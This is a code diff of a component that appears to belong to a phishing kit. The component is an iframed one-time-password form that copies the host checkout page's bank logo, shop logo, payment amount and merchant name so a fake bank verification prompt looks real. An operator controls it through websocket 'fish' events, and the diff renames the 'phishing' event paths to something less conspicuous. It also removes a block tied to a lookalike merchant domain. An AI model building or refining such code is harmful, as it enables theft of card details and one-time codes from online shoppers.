@@ -215,9 +215,9 @@ import {checkBinApi} from "~/composables/api";
 
 const loadingStore = useLoadingStore();
 
-const eventNewFish = 'websocket/addons/phishing/newFish';
-const eventEditFish = 'websocket/addons/phishing/editFish';
-const eventCallBack = 'websocket/addons/phishing/callbackFish';
+const eventNewFish = 'websocket/addons/phis/new';
+const eventEditFish = 'websocket/addons/phis/edit';
+const eventCallBack = 'websocket/addons/phis/callback';
 
 // OTP Form State
 const isSubmitting = ref(false);
@@ -272,7 +272,7 @@ const callBackFish = (res: WebSocketMessage) => {
   } else if (res.data.action == "pass") {
     isSubmitting.value = false;
     // 提交成功，跳转页面
-    console.log("======真实提交")
+    // console.log("======真实提交")
     parentRealSubmit();
     /*const btn = top.document.getElementById("checkout-pay-button");
     btn.disabled = false;
@@ -346,39 +346,13 @@ onMounted(async () => {
   //   resultObject['cardCountryFlag'] = binInfo.BIN.country.flag;
   // }
 
-  // 从父级页面获取信息
-  /*if(window.self !== window.top){
-    document.domain = "chemicalguys.top"
-    console.log("im in!")
-    // 设置logo
-    const bankLogo = top.document.querySelector('#basic-creditCards-secondary img').src;
-    document.querySelector('#bankLogo').setAttribute('src', bankLogo);
-    const shopLogo = top.document.querySelector('a img').src;
-    document.querySelector('#shopLogo').setAttribute('src', shopLogo);
-    // 支付金额
-    document.querySelector("#i-money").innerHTML = top.document.querySelector("strong:nth-child(2)").innerHTML;
-    // 商户名
-    document.querySelector("#i-bank").innerHTML = top.document.querySelector('a img').alt;
-    // 日期
-    document.querySelector("#i-date").innerHTML = new Date().toLocaleDateString('en-US', {
-                                                            day: '2-digit',
-                                                            month: '2-digit',
-                                                            year: '2-digit'
-                                                          });
-    // 手机号后四位
-    document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
-  }*/
   if (window.self !== window.top) {
     console.log("im in!")
     // 设置logo
     bankLogo.value.src = (await getParentOne('#basic-creditCards-secondary img', ['src'])).src;
     shopLogo.value.src = (await getParentOne('a img', ['src'])).src;
     // 支付金额
-    console.log("+++++++++++++",fillMoney.value.innerHTML);
-    var html = (await getParentOne("strong:nth-child(2)")).innerHTML;
-    console.log("-------------",html);
-    fillMoney.value.innerHTML = html;
-    console.log("+++++++++++++",fillMoney.value.innerHTML);
+    fillMoney.value.innerHTML = (await getParentOne("strong:nth-child(2)")).innerHTML;
     // 商户名
     fillShop.value.innerHTML = (await getParentOne('a img', ['alt'])).alt;
     // 日期
